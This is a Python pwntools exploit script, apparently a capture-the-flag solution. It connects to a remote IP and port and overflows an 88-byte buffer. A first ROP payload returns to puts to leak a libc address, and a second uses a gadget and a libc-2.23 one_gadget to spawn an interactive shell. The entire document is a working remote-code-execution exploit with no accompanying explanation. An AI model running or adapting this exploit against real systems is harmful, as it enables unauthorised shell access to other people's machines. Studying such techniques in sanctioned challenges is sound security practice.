from threading import Thread
from pwn import *

# context.log_level='debug'

libc = ELF('./libc-2.23.so', checksec=False)
libc.sym['one_gadget'] = 0x45226
libc.sym['xor_rax_rax_ret'] = 0x8b945

buff_size = 88
stop_gadget = 0x400705
main = 0x4005c0
useful_gadget = 0x4007ba
puts_plt = 0x400560
offset = 0x3c5620

p = connect('34.159.129.6', 30550)
payload1 = b'A'*88 + p64(puts_plt) + p64(main)
p.recvline()
p.send(payload1)

data = p.recv()
leak_addr = u64(data[24:24+8])
libc.address = leak_addr - offset

payload2 = b'A'*88
payload2 += p64(libc.sym['xor_rax_rax_ret'])
payload2 += p64(libc.sym['one_gadget'])

p.send(payload2)
p.interactive()
p.close()